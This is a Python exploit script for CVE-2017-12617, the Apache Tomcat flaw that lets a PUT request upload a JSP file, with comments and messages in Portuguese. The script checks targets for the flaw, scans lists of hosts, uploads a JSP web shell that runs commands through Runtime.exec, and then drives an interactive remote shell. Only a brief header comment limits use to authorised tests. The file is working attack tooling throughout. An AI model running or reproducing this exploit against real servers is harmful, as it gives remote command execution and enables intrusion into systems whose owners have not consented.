#!/usr/bin/env python3
import requests
import re
import signal
import sys
import argparse
from urllib3.exceptions import InsecureRequestWarning

# Script adaptado para Python 3.
# O uso desta ferramenta deve ser restrito a ambientes de teste controlados e autorizados.
# A exploração de vulnerabilidades em sistemas alheios é ilegal.

# Desabilita avisos de certificado SSL inválido
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

banner = """
    _______      ________    ___   ___  __ ______      __ ___   __ __ ______  
  / ____\ \    / /  ____|   |__ \ / _ \/_ |____  |    /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /  
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /   
 | |____   \  /  | |____     / /_| |_| || | / /        | |/ /| (_) | | / /    
  \_____|   \/   |______|   |____|\___/ |_|/_/         |_|____\___/|_|/_/     
                                                                            
[@intx0x80]
"""

def signal_handler(signal, frame):
    print(f"\n{bcolors.FAIL}[-] Saindo...{bcolors.ENDC}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def removetags(tags):
    remove = re.compile('<.*?>')
    txt = re.sub(remove, '\n', tags)
    return txt.replace("\n\n\n", "\n")

def getContent(url, f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        res = requests.get(f"{url}/{f}", headers=headers, verify=False, timeout=10)
        return res.content
    except requests.exceptions.RequestException as e:
        print(f"{bcolors.FAIL}[-] Erro ao conectar em {url}: {e}{bcolors.ENDC}")
        return b''

def createPayload(url, f):
    evil = '<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User--Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        req = requests.put(f"{url}{f}/", data=evil, headers=headers, verify=False, timeout=10)
        if req.status_code == 201:
            print(f"{bcolors.OKGREEN}[+] Arquivo de teste criado com sucesso.{bcolors.ENDC}")
    except requests.exceptions.RequestException as e:
        print(f"{bcolors.FAIL}[-] Falha ao criar payload em {url}: {e}{bcolors.ENDC}")

def RCE(url, f):
    EVIL = f"""<FORM METHOD=GET ACTION='{f}'>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {{
       String s = null;
       try {{
           Process p = Runtime.getRuntime().exec(cmd,null,null);
           BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
           while((s = sI.readLine()) != null) {{ output += s+"</br>"; }}
       }}  catch(IOException e) {{   e.printStackTrace();   }}
    }}
%>
<pre><%=output %></pre>"""
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        requests.put(f"{url}{f}/", data=EVIL, headers=headers, verify=False, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"{bcolors.FAIL}[-] Falha ao enviar o webshell para {url}: {e}{bcolors.ENDC}")


def shell(url, f):
    print(f"{bcolors.OKBLUE}[*] Shell interativo iniciado. Digite 'q' ou 'Q' para sair.{bcolors.ENDC}")
    while True:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        cmd = input(f"{bcolors.BOLD}$ {bcolors.ENDC}")
        payload = {'cmd': cmd}
        if cmd.lower() == "q":
            break
        
        try:
            res = requests.get(f"{url}/{f}", params=payload, headers=headers, verify=False, timeout=15)
            # Decodifica a resposta de bytes para string
            content_str = res.content.decode('utf-8', errors='ignore')
            t = removetags(content_str)
            print(t)
        except requests.exceptions.RequestException as e:
            print(f"{bcolors.FAIL}[-] Erro ao executar comando: {e}{bcolors.ENDC}")
            break

def main():
    usage_text = f"""
{bcolors.HEADER}
./cve-2017-12617.py [options]

Opções:
  -u, --url [URL]     Verifica se um alvo é vulnerável.
  -p, --pwn [NOME]    Gera e faz upload de um webshell com o nome de arquivo especificado.
  -l, --list [ARQUIVO]  Verifica uma lista de hosts de um arquivo.

Exemplos de uso:
  ./cve-2017-12617.py -u http://127.0.0.1
  ./cve-2017-12617.py --url http://127.0.0.1 --pwn webshell
  ./cve-2017-12617.py -l hosts.txt
{bcolors.ENDC}"""

    parser = argparse.ArgumentParser(description=banner, usage=usage_text, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-u", "--url", dest="U", help="URL do Alvo")
    parser.add_argument("-p", "--pwn", dest="P", help="Nome do arquivo para o webshell (ex: 'shell')")
    parser.add_argument("-l", "--list", dest="L", help="Arquivo com lista de hosts")

    args = parser.parse_args()

    if not any([args.U, args.P, args.L]):
        print(parser.usage)
        sys.exit(0)

    print(f"{bcolors.OKGREEN}{banner}{bcolors.ENDC}")
    
    if args.U and not args.P and not args.L:
        url = args.U.rstrip('/')
        checker = "Poc.jsp"
        print(f"{bcolors.BOLD}[*] Nome do arquivo de teste: {checker}{bcolors.ENDC}")
        createPayload(f"{url}/", checker)
        con = getContent(url, checker)
        if b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
            print(f"{bcolors.WARNING}[+] {url} é VULNERÁVEL a CVE-2017-12617{bcolors.ENDC}")
            print(f"{bcolors.WARNING}[+] Acesse: {url}/{checker}{bcolors.ENDC}")
        else:
            print(f"{bcolors.FAIL}[-] {url} não parece ser vulnerável.{bcolors.ENDC}")

    elif args.U and args.P and not args.L:
        url = args.U.rstrip('/')
        pwn_file = f"{args.P}.jsp"
        print(f"{bcolors.BOLD}[*] Fazendo upload do webshell para {url}/{pwn_file}...{bcolors.ENDC}")
        RCE(f"{url}/", pwn_file)
        shell(url, pwn_file)

    elif args.L and not args.U and not args.P:
        host_file = args.L
        print(f"[*] Verificando hosts do arquivo {host_file}")
        checker = "Poc.jsp"
        try:
            with open(host_file, "r") as f:
                for line in f:
                    host = line.strip().rstrip('/')
                    if not host:
                        continue
                    print(f"{bcolors.OKBLUE}[*] Testando {host}...{bcolors.ENDC}")
                    createPayload(f"{host}/", checker)
                    con = getContent(host, checker)
                    if b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
                        print(f"{host} {bcolors.WARNING}[ VULNERÁVEL ]{bcolors.ENDC}")
                    else:
                        print(f"{host} {bcolors.OKGREEN}[ NÃO VULNERÁVEL ]{bcolors.ENDC}")
        except FileNotFoundError:
            print(f"{bcolors.FAIL}[-] Arquivo de lista '{host_file}' não encontrado.{bcolors.ENDC}")

if __name__ == "__main__":
    main()
